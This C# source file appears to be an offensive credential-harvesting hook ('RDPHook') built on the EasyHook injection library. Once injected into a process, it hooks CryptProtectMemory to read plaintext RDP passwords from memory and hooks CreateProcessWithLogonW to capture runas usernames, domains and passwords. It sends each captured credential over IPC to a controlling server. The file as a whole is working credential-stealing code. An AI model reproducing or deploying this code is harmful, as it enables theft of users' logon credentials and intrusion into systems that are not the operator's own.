// RemoteFileMonitor (File: FileMonitorHook\InjectionEntryPoint.cs)
//
// Copyright (c) 2017 Justin Stenning
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
// 
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
// 
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
// THE SOFTWARE.
//
// Please visit https://easyhook.github.io for more information
// about the project, latest updates and other tutorials.

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace RDPHook
{
    
    public class InjectionEntryPoint: EasyHook.IEntryPoint
    {




        [Flags]
        enum CreationFlags
        {
            CREATE_SUSPENDED = 0x00000004,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        }

        [Flags]
        enum LogonFlags
        {
            LOGON_WITH_PROFILE = 0x00000001,
            LOGON_NETCREDENTIALS_ONLY = 0x00000002
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public int cb;
            public String reserved;
            public String desktop;
            public String title;
            public int x;
            public int y;
            public int xSize;
            public int ySize;
            public int xCountChars;
            public int yCountChars;
            public int fillAttribute;
            public int flags;
            public UInt16 showWindow;
            public UInt16 reserved2;
            public byte reserved3;
            public IntPtr stdInput;
            public IntPtr stdOutput;
            public IntPtr stdError;
        }
        /// <summary>
        /// Reference to the server interface
        /// </summary>
        ServerInterface _server = null;

        /// <summary>
        /// Message queue of all files accessed
        /// </summary>
        Queue<string> _messageQueue = new Queue<string>();

        /// <summary>
        /// EasyHook requires a constructor that matches <paramref name="context"/> and any additional parameters as provided
        /// in the original call to <see cref="EasyHook.RemoteHooking.Inject(int, EasyHook.InjectionOptions, string, string, object[])"/>.
        /// 
        /// Multiple constructors can exist on the same <see cref="EasyHook.IEntryPoint"/>, providing that each one has a corresponding Run method (e.g. <see cref="Run(EasyHook.RemoteHooking.IContext, string)"/>).
        /// </summary>
        /// <param name="context">The RemoteHooking context</param>
        /// <param name="channelName">The name of the IPC channel</param>
        public InjectionEntryPoint(
            EasyHook.RemoteHooking.IContext context,
            string channelName)
        {
            // Connect to server object using provided channel name
            _server = EasyHook.RemoteHooking.IpcConnectClient<ServerInterface>(channelName);

            // If Ping fails then the Run method will be not be called
            _server.Ping();
        }
        //Need LoadLibrary to import dpapi.dll in case it hasn't been imported yet
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllToLoad);
        /// <summary>
        /// The main entry point for our logic once injected within the target process. 
        /// This is where the hooks will be created, and a loop will be entered until host process exits.
        /// EasyHook requires a matching Run method for the constructor
        /// </summary>
        /// <param name="context">The RemoteHooking context</param>
        /// <param name="channelName">The name of the IPC channel</param>
        public void Run(
            EasyHook.RemoteHooking.IContext context,
            string channelName)
        {
            // Injection is now complete and the server interface is connected
            _server.IsInstalled(EasyHook.RemoteHooking.GetCurrentProcessId());
            
            //Install hooks
                LoadLibrary("Advapi32.dll");
                var CreateProcessWithLogonW = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("Advapi32.dll", "CreateProcessWithLogonW"),
                new CreateProcessWithLogonW_Delegate(CreateProcessWithLogonW_Hook),
                this);


                LoadLibrary("dpapi.dll");
                var createCryptHook = EasyHook.LocalHook.Create(
                EasyHook.LocalHook.GetProcAddress("dpapi.dll", "CryptProtectMemory"),
                new CryptProtectMemory_Delegate(CryptProtectMemory_Hook),
                this);



            // Activate hooks on all threads except the current thread
            CreateProcessWithLogonW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
            createCryptHook.ThreadACL.SetExclusiveACL(new Int32[] { 0 });

            _server.ReportMessage("[+] Hook in place in process " + context.HostPID.ToString());

            // Wake up the process (required if using RemoteHooking.CreateAndInject)
            EasyHook.RemoteHooking.WakeUpProcess();

            try
            {
                // Loop until program closes (i.e. IPC fails)
                while (true)
                {
                    System.Threading.Thread.Sleep(500);

                    string[] queued = null;

                    lock (_messageQueue)
                    {
                        queued = _messageQueue.ToArray();
                        _messageQueue.Clear();
                    }

                    // Send newly monitored file accesses to server
                    if (queued != null && queued.Length > 0)
                    {
                        _server.ReportMessages(queued);
                    }
                    else
                    {
                        _server.Ping();
                    }
                }
            }
            catch
            {
                // Ping() or ReportMessages() will raise an exception if host is unreachable
            }

            // Remove hooks
            CreateProcessWithLogonW.Dispose();
            createCryptHook.Dispose();
           

            // Finalise cleanup of hooks
            EasyHook.LocalHook.Release();
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        delegate bool CryptProtectMemory_Delegate(IntPtr pData, uint cbData, uint dwFlags);
        [DllImport("dpapi.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
        static extern bool CryptProtectMemory(
            IntPtr pData,
            uint cbData,
            uint dwFlags);

        bool CryptProtectMemory_Hook(
           IntPtr pData,
           uint cbData,
           uint dwFlags)
        {

            try
            {
                lock (this._messageQueue)
                {
                    if (this._messageQueue.Count < 1000)
                    {


                        //Get string from memory address passed to CryptProtectMemory
                        var password = Marshal.PtrToStringUni(pData, (int)cbData);


                        this._messageQueue.Enqueue(
                            string.Format("[+] RDP Creds: PID/ThreadID: {0}/{1}, Potential Password: {2}",
                            EasyHook.RemoteHooking.GetCurrentProcessId(), EasyHook.RemoteHooking.GetCurrentThreadId(), password));

                    }
                }
            }
            catch
            {
                // swallow exceptions so that any issues caused by this code do not crash target process
            }
            return CryptProtectMemory(pData, cbData, dwFlags);
        }


            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        delegate bool CreateProcessWithLogonW_Delegate(String userName,
           String domain,
           String password,
           LogonFlags logonFlags,
           String applicationName,
           String commandLine,
           CreationFlags creationFlags,
           UInt32 environment,
           String currentDirectory,
           ref StartupInfo startupInfo,
           out PROCESS_INFORMATION processInformation);
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessWithLogonW(
           String userName,
           String domain,
           String password,
           LogonFlags logonFlags,
           String applicationName,
           String commandLine,
           CreationFlags creationFlags,
           UInt32 environment,
           String currentDirectory,
           ref StartupInfo startupInfo,
           out PROCESS_INFORMATION processInformation);

        bool CreateProcessWithLogonW_Hook(
            String userName,
           String domain,
           String password,
           LogonFlags logonFlags,
           String applicationName,
           String commandLine,
           CreationFlags creationFlags,
           UInt32 environment,
           String currentDirectory,
           ref StartupInfo startupInfo,
           out PROCESS_INFORMATION processInformation)

        {
        
            try
            {
                lock (this._messageQueue)
                {
                    if (this._messageQueue.Count < 1000)
                    {


                        //Get string from memory address passed to CryptProtectMemory
                        var Domain = domain;
                        var username = userName;
                        var Password = password;

                     
                        this._messageQueue.Enqueue(
                            string.Format("[+] Runas Creds: PID/ThreadID: {0}/{1},Username: {2}, Domain: {4},  Password: {3}",
                            EasyHook.RemoteHooking.GetCurrentProcessId(), EasyHook.RemoteHooking.GetCurrentThreadId(), username, Password, Domain));
                        
                    }
                }
            }
            catch
            {
                // swallow exceptions so that any issues caused by this code do not crash target process
            }

           
            return CreateProcessWithLogonW(userName, domain, password, logonFlags, applicationName, commandLine,creationFlags,environment, currentDirectory,ref startupInfo,out processInformation);
        }
    }
}
